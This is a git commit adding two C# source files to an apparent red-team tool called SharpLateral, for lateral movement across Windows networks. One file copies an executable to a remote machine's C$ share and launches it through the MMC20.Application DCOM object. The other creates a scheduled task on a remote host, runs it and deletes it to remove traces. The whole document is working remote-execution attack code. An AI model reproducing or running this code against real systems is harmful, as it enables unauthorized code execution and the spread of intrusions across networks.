5806b0128090b56b83961c0577b950a80b14e1b3
Mert Daş <48562581+mertdas@users.noreply.github.com>
2023-10-26 19:50:09 +0300

    Add files via upload

---
+++ SharpLateral/Lateral/DcomExec.cs
@@ -0,0 +1,63 @@
+﻿using System;
+using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+namespace SharpLateral
+{
+    class RedDcom
+    {
+        [DllImport("ole32.dll")]
+        private static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);
+
+        public static void Dcomexec(string[] args)
+        {
+            if (args.Length != 2)
+            {
+                Console.WriteLine("Usage: SharpLateral reddcom Client2 C:\\Users\\Administrator\\Desktop\\d.exe");
+                return;
+            }
+
+            string hedefIp = args[0];
+            string dosyaYolu = args[1];
+
+            try
+            {
+                string dosyaAdi = System.IO.Path.GetFileName(dosyaYolu);
+                string hedefCShareYolu = $@"\\{hedefIp}\C$\Windows\Temp\{dosyaAdi}";
+
+                System.IO.File.Copy(dosyaYolu, hedefCShareYolu, true);
+
+                Console.WriteLine("File copied via MMC20 Application..");
+
+                string ProgID = "MMC20.Application";
+
+                Type comType = Type.GetTypeFromProgID(ProgID, hedefIp);
+                dynamic remoteComObject = Activator.CreateInstance(comType);
+
+                dynamic document = remoteComObject.Document;
+                dynamic activeView = document.ActiveView;
+
+                string command = "cmd.exe";
+                string parameters = $"/c start {hedefCShareYolu}";
+                int flags = 7;
+
+                activeView.ExecuteShellCommand(command, null, parameters, flags);
+
+                Console.WriteLine("File succesfully executed via DCOM");
+            }
+            catch (UnauthorizedAccessException ex)
+            {
+                Console.Error.WriteLine("Unauthorized Access: " + ex.Message);
+            }
+            catch (System.Runtime.InteropServices.COMException ex)
+            {
+                Console.Error.WriteLine("COM Exception: " + ex.Message);
+            }
+            catch (Exception ex)
+            {
+                Console.Error.WriteLine("An error occurred: " + ex.Message);
+            }
+        }
+    }
+}
---
+++ SharpLateral/Lateral/RedAtExec.cs
@@ -0,0 +1,47 @@
+﻿using System;
+using System.Threading.Tasks;
+using Microsoft.Win32.TaskScheduler;
+using Task = Microsoft.Win32.TaskScheduler.Task;
+
+namespace SharpLateral
+{
+    class Schedule
+    { 
+            public static void Schedule1(string[] args) { 
+            if (args.Length < 1)
+            {
+                Console.WriteLine("Usage: SharpLateral.exe schedule 192.168.31.134 C:\\windows\\system32\\notepad.exe ttt");
+                return;
+            }
+
+            string taskName = args[2];
+            string command = args[1];
+            string remoteIp = args[0];
+
+            string taskFullPath = $@"\{taskName}";
+
+            using (TaskService ts = new TaskService(remoteIp))
+            {
+                TaskDefinition td = ts.NewTask();
+                td.RegistrationInfo.Description = "My Scheduled Task";
+
+                td.Triggers.Add(new DailyTrigger { DaysInterval = 1, StartBoundary = DateTime.Today.AddHours(10) });
+
+                td.Actions.Add(new ExecAction(command, null, null));
+
+                ts.RootFolder.RegisterTaskDefinition(taskFullPath, td);
+
+                Task task = ts.GetTask(taskFullPath);
+                task.Run();
+
+
+                Console.WriteLine($"Scheduled task '{taskName}' created and started on remote machine {remoteIp}");
+
+                ts.RootFolder.DeleteTask(taskName, false);
+
+                Console.WriteLine($"Task '{taskName}' deleted succesfully");
+            }
+
+        }
+    }
+}
